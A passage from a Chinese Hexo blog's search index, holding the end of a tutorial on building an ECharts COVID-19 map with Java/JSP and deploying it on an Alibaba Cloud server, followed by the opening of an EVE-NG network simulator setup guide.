//读取输入流</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is,&quot;utf-8&quot;));</span><br><span class="line">        //输出</span><br><span class="line">        String text = br.readLine();</span><br><span class="line">        System.out.println(text);</span><br><span class="line"></span><br><span class="line">        //关闭流</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出实例（部分）</p><p><img src="https://b3logfile.com/file/2020/11/image-ecad5c0a.png" alt="image.png"></p><p>数据既然拿到了，就需要在页面上展示我们所获取到的数据，也就是一个疫情地图，页面可以自行优化。</p><p>css样式代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">var myChart = echarts.init(document.getElementById(&#x27;main&#x27;));</span><br><span class="line">function updateMap(num)&#123;</span><br><span class="line">$(&quot;.control&quot;).show();</span><br><span class="line">$(&quot;.control:eq(&quot;+num+&quot;)&quot;).hide();</span><br><span class="line">myChart.clear();</span><br><span class="line">var opt = null;</span><br><span class="line">switch(num)&#123;</span><br><span class="line">case 0:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">        // 设置标题和副标题及副标题跳转链接</span><br><span class="line">        title: &#123;</span><br><span class="line">            text: &#x27;新冠疫情-国内累计数据&#x27;,</span><br><span class="line">            subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">            sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 数据提示框</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">            formatter: function (params, ticket, callback) &#123;</span><br><span class="line">                if(params.data)</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">                else</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;无疫情信息&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 视觉映射方案:</span><br><span class="line">        // visualMap默认是连续映射，我们也可以设置为分段型，对于分布范围广的数据</span><br><span class="line">        // 使用透明度来区分疫情严重情况</span><br><span class="line">        visualMap: &#123;</span><br><span class="line">            type: &#x27;piecewise&#x27;,</span><br><span class="line">            pieces: [</span><br><span class="line">                &#123;gt: 2000, color: &#x27;darkred&#x27;&#125;,                        // (1500, Infinity]</span><br><span class="line">                &#123;gt: 1300, lte: 2000, color: &#x27;red&#x27;, colorAlpha: 1&#125;,  // (1000, 1500]</span><br><span class="line">                &#123;gt: 800, lte: 1300, color: &#x27;red&#x27;, colorAlpha: 0.8&#125;,</span><br><span class="line">                &#123;gt: 500, lte: 800, color: &#x27;red&#x27;, colorAlpha: 0.6&#125;,</span><br><span class="line">                &#123;gt: 200, lte: 500, color: &#x27;red&#x27;, colorAlpha: 0.4&#125;,</span><br><span class="line">                &#123;gt: 50, lte: 200, color: &#x27;red&#x27;, colorAlpha: 0.3&#125;,</span><br><span class="line">                &#123;lt: 50, color: &#x27;red&#x27;, colorAlpha: 0.2&#125;          // (-Infinity, 100)</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // 具体数据</span><br><span class="line">        series: [</span><br><span class="line">            &#123;</span><br><span class="line">                name: &#x27;国内各省确诊病例&#x27;, // 系列名称</span><br><span class="line">                zoom:1.2,//地图大小</span><br><span class="line">                type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">                map: &#x27;china&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">                roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">                label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">                    show: true,</span><br><span class="line">                    formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">                    fontSize: 8</span><br><span class="line">                &#125;,</span><br><span class="line">                data: data.data,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 1:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">        // 设置标题和副标题及副标题跳转链接</span><br><span class="line">        title: &#123;</span><br><span class="line">            text: &#x27;新冠疫情-国内新增数据&#x27;,</span><br><span class="line">            subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">            sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 数据提示框</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">            formatter:  function (params, ticket, callback) &#123;</span><br><span class="line">                if(params.data)</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">                else</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;无疫情信息&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">// 视觉映射方案:</span><br><span class="line">        // visualMap默认是连续映射，我们也可以设置为分段型，对于分布范围广的数据</span><br><span class="line">        // 使用透明度来区分疫情严重情况</span><br><span class="line">        visualMap: &#123;</span><br><span class="line">            type: &#x27;piecewise&#x27;,</span><br><span class="line">            pieces: [</span><br><span class="line">                &#123;gt: 50, color: &#x27;darkred&#x27;&#125;,                        // (1500, Infinity]</span><br><span class="line">                &#123;gt: 30, lte: 50, color: &#x27;red&#x27;, colorAlpha: 1&#125;,  // (1000, 1500]</span><br><span class="line">                &#123;gt: 20, lte: 30, color: &#x27;red&#x27;, colorAlpha: 0.8&#125;,</span><br><span class="line">                &#123;gt: 10, lte: 20, color: &#x27;red&#x27;, colorAlpha: 0.6&#125;,</span><br><span class="line">                &#123;gt: 5, lte: 10, color: &#x27;red&#x27;, colorAlpha: 0.4&#125;,</span><br><span class="line">                &#123;gt: 1, lte: 5, color: &#x27;red&#x27;, colorAlpha: 0.3&#125;,</span><br><span class="line">                &#123;lt: 1, color: &#x27;red&#x27;, colorAlpha: 0.0&#125;          // (-Infinity, 100)</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // 具体数据</span><br><span class="line">        series: [</span><br><span class="line">            &#123;</span><br><span class="line">                name: &#x27;国内各省确诊病例&#x27;, // 系列名称</span><br><span class="line">                zoom:1.2,//地图大小</span><br><span class="line">                type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">                map: &#x27;china&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">                roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">                label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">                    show: true,</span><br><span class="line">                    formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">                    fontSize: 8</span><br><span class="line">                &#125;,</span><br><span class="line">                data: data.today,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 2:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">    // 设置标题和副标题及副标题跳转链接</span><br><span class="line">    title: &#123;</span><br><span class="line">      text: &#x27;新冠疫情-全球累计数据&#x27;,</span><br><span class="line">      subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">      sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 数据提示框</span><br><span class="line">    tooltip: &#123;</span><br><span class="line">      trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">      //formatter: &#x27;&#123;b&#125;&lt;br/&gt;&#123;c&#125; (人)&#x27; // 提示数据格式br表示换行，地图 : &#123;a&#125;（系列名称），&#123;b&#125;（区域名称），&#123;c&#125;（合并数值）, &#123;d&#125;（无）</span><br><span class="line">      formatter:function (params, ticket, callback) &#123;</span><br><span class="line">        if(params.data)</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">        else</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt; 未公布感染人数&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 视觉映射方案1：,疫情颜色根据传染病疫情等级分类为5个级别：黄色-橙色-深橙色-红色-深红色</span><br><span class="line">    // 为了是视觉分布更好，可以添加更多的颜色范围，然后适当调小max的值，因为美国和其它国家相差太大</span><br><span class="line">    /**/</span><br><span class="line">    visualMap: &#123;</span><br><span class="line">      min: 1, // 颜色映射对应的最小值，即对应下面的lightskyblue</span><br><span class="line">      max: 500000, // 颜色映射对应的最大值，即对应下面的orangered</span><br><span class="line">      text: [&#x27;严重&#x27;, &#x27;轻微&#x27;], // 映射图上下标记文本</span><br><span class="line">      realtime: true, // 是否显示拖拽手柄，映射条可以拖拽调整要映射的范围</span><br><span class="line">      calculable: true, // 拖拽时，是否实时更新地图</span><br><span class="line">      inRange: &#123;</span><br><span class="line">        color: [&#x27;rgba(222,0,0,0.2)&#x27;,&#x27;rgba(160,0,0,1)&#x27;] // 颜色映射范围，最小值，过渡值，最大值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    // 具体数据</span><br><span class="line">    series: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &#x27;全球各国确诊病例&#x27;, // 系列名称</span><br><span class="line">        zoom:1.2,//地图大小</span><br><span class="line">        type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">        map: &#x27;world&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">        roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">        label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">          show: true,</span><br><span class="line">          fontSize:8,</span><br><span class="line">          //formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">          formatter:function (params, ticket, callback) &#123;</span><br><span class="line">            //公布了数据 且 数据累计数据大于5万的显示国家名称</span><br><span class="line">            if(params.data &amp;&amp; params.data.value&gt;50000) &#123;</span><br><span class="line">              return params.name;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              return &#x27;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        data: data.g_data,</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 3:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">    // 设置标题和副标题及副标题跳转链接</span><br><span class="line">    title: &#123;</span><br><span class="line">      text: &#x27;新冠疫情-全球新增数据&#x27;,</span><br><span class="line">      subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">      sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 数据提示框</span><br><span class="line">    tooltip: &#123;</span><br><span class="line">      trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">      formatter:function (params, ticket, callback) &#123;</span><br><span class="line">        if(params.data)</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">        else</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt; 未公布感染人数&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 视觉映射方案1：,疫情颜色根据传染病疫情等级分类为5个级别：黄色-橙色-深橙色-红色-深红色</span><br><span class="line">    // 为了是视觉分布更好，可以添加更多的颜色范围，然后适当调小max的值，因为美国和其它国家相差太大</span><br><span class="line">    /**/</span><br><span class="line">    visualMap: &#123;</span><br><span class="line">      min: 0, // 颜色映射对应的最小值，</span><br><span class="line">      max: 20000, // 颜色映射对应的最大值</span><br><span class="line">      text: [&#x27;严重&#x27;, &#x27;轻微&#x27;], // 映射图上下标记文本</span><br><span class="line">      realtime: true, // 是否显示拖拽手柄，映射条可以拖拽调整要映射的范围</span><br><span class="line">      calculable: true, // 拖拽时，是否实时更新地图</span><br><span class="line">      inRange: &#123;</span><br><span class="line">        color: [&#x27;rgba(160,0,0,0)&#x27;,&#x27;rgba(160,0,0,1)&#x27;] // 颜色映射范围，最小值，过渡值，最大值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 具体数据</span><br><span class="line">    series: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &#x27;全球各国新增病例&#x27;, // 系列名称</span><br><span class="line">        zoom:1.2,//地图大小</span><br><span class="line">        type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">        map: &#x27;world&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">        roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">        label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">          show: true,</span><br><span class="line">          fontSize:8,</span><br><span class="line">          //formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">          formatter:function (params, ticket, callback) &#123;</span><br><span class="line">            //公布了数据 且 数据累计数据大于5万的显示国家名称</span><br><span class="line">            if(params.data &amp;&amp; params.data.value&gt;1000 || params.name == &#x27;中国&#x27;) &#123;</span><br><span class="line">              return params.name;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              return &#x27;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        data: data.g_today,</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"> myChart.setOption(opt);</span><br><span class="line">&#125;</span><br><span class="line">updateMap(0);</span><br></pre></td></tr></table></figure><p>网页怎么进行数据展示？需要在一个网页里实时获取数据，html是静态的，写完之后页面固定。所以这里使用了能嵌套java代码的jsp来做这个,使用了echarts来做地图可视化，直接引入echarts.js，具体代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.net.URL&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.net.URLConnection&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;疫情地图&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        //创建URL对象</span><br><span class="line">        URL u1 = new URL(&quot;https://zaixianke.com/yq/all&quot;);</span><br><span class="line">        //建立连接</span><br><span class="line">        URLConnection con = u1.openConnection();</span><br><span class="line">        //获取数据流</span><br><span class="line">        InputStream is = con.getInputStream();</span><br><span class="line">        //读取输入流</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is,&quot;utf-8&quot;));</span><br><span class="line">        //输出</span><br><span class="line">        String text = br.readLine();</span><br><span class="line">        //System.out.println(text);</span><br><span class="line"></span><br><span class="line">        //关闭流</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">         %&gt;</span><br><span class="line">        var data = &lt;%= text %&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/echarts/4.7.0/echarts.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;http://cdn.zaixianke.com/china.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;http://cdn.zaixianke.com/world.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;main&quot; style=&quot;width: 100%;height:600px;&quot;&gt;&lt;/div&gt; &lt;br&gt;</span><br><span class="line">&lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(0)&quot;&gt;国内累计&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(1)&quot;&gt;国内新增&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(2)&quot;&gt;全球累计&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(3)&quot;&gt;全球新增&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;control.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>此Demo的代码就编写完了。通过java的URL工具类访问API，然后使用IO流读取数据再存入String类型的text，再通过JSP在web页面加载数据，最后通过echarts可视化输出疫情数据分布图。</p><h2 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h2><p>事出突然，心血来潮，手里没测试的服务器，本来想通过本地搭建的我想了一想还是算了，就选了阿里按时计费的来进行测试，来记录从购买到项目搭建的全过程吧。</p><ol><li>购买阿里云服务器，进入选择产品，<a href="https://www.aliyun.com/product/ecs?spm=5176.19720258.J_8058803260.13.10552c4aEauo6l">云服务器 ECS</a>，选择按量付费，配置自己选择即可，测试照着便宜的买就行了</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-bfd29516.png" alt="image.png"></p><ol start="2"><li>选择宝塔镜像，快速搭建，避免新手敲Linux命令。</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-a0cdae5e.png" alt="image.png"></p><ol start="3"><li>带宽拉满（自己选择），把80端口勾上，反正后面也要放行80端口，这里勾上简单、方便、节约时间。</li></ol><p><img src="file:///C:\Users\root\AppData\Local\Temp\ksohtml2004\wps1.jpg"><img src="https://b3logfile.com/file/2020/11/image-28b1bd4b.png" alt="image.png"></p><ol start="4"><li>设置密码，注意密码规则</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-479cc8cd.png" alt="image.png"></p><ol start="5"><li>设置资源释放时间，服务器按小时计费，会一直扣钱。购买成功之后转到控制台</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-27cdd824.png" alt="image.png"></p><ol start="6"><li>在实例中，操作栏点击配置规则，配置服务器的安全规则，宝塔默认端口为8888</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-6327d0ce.png" alt="image.png"></p><ol start="7"><li>登陆服务器，输入bt default，显示宝塔连接地址及一些信息，复制密码，因为第一次初始化要改密码。自己可以改用户名</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-ce645550.png" alt="image.png"></p><ol start="8"><li>登陆之后去软件商店搜索tomcat并安装进行端口配置，然后进行保存，然后重启tomcat</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-23af914b.png" alt="image.png"></p><p>访问看看是否配置成功</p><p><img src="https://b3logfile.com/file/2020/11/image-65add257.png" alt="image.png"></p><ol start="9"><li>上传自己的项目文件(css文件和jsp文件)</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-00e2431a.png" alt="image.png"></p><h2 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h2><p><img src="https://b3logfile.com/file/2020/11/image-ffe42b60.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ECharts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVE-NG入门使用</title>
      <link href="/posts/1565/"/>
      <url>/posts/1565/</url>
      
        <content type="html"><![CDATA[<h4 id="EVE-NG介绍"><a href="#EVE-NG介绍" class="headerlink" title="EVE-NG介绍"></a>EVE-NG介绍</h4><p>eve-ng模拟器是一款非常强大的模拟器，它不仅可以模拟网络设备，也可以运行虚拟机。这款模拟器可以兼容很多厂家的设备，比如华为、思科、华三等等。</p><h4 id="EVE-NG安装"><a href="#EVE-NG安装" class="headerlink" title="EVE-NG安装"></a>EVE-NG安装</h4><ul><li>VMware</li><li>EVE-NG镜像</li></ul><p>eve-ng官方地址（<a href="https://www.eve-ng.net/%EF%BC%89">https://www.eve-ng.net/）</a><br>eve-ng中文网地址（<a href="http://eve-ng.cn/doku.php%EF%BC%89">http://eve-ng.cn/doku.php）</a></p><p>这里我使用的是汉化版，直接下载 EVE-NG汉化版</p><p><img src="https://img.hacpai.com/file/2020/02/image-1c91ae6d.png" alt="image.png"><br>直接点击ovf文件开启虚拟机</p><p>虚拟机的配置根据自己需求进行配置（虚拟化功能需要打开）<br><img src="https://img.hacpai.com/file/2020/02/image-4b0d6462.png" alt="image.png"></p><p>开启虚拟机</p><p><img src="https://img.hacpai.com/file/2020/02/image-56406ca2.png" alt="image.png"><br>访问ip地址<br><img src="https://img.hacpai.com/file/2020/02/image-ffa15bdd.png" alt="image.png"></p><p>安装完成<br><img src="https://img.hacpai.com/file/2020/02/image-1bac10c3.png" alt="image.png"></p><h4 id="EVE-NG配置"><a href="#EVE-NG配置" class="headerlink" title="EVE-NG配置"></a>EVE-NG配置</h4><p>中文网下载EVE-NG-Win-Client-Pack文件安装之后就可以配置设备和抓包</p><p>汉化版的集成镜像</p><p> Dynamips</p><ul><li>C1710</li><li>C3725</li><li>C7200</li></ul><p> IOl</p><ul><li>L2</li><li>L3</li></ul><p>添加镜像</p><ul><li>设备镜像</li><li>文件上传工具</li><li>ssh工具</li></ul><p>先用ssh连接后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限<br>再使用上传工具上传镜像</p><p>上传Dynamips镜像<br>将镜像上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;dynamips目录下<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 命令修正镜像权限</p><p>上传Qemu镜像<br>将镜像目录上传到&#x2F;opt&#x2F;unetlab&#x2F;addons&#x2F;qemu目录下<br>然后执行 &#x2F;opt&#x2F;unetlab&#x2F;wrappers&#x2F;unl_wrapper -a fixpermissions 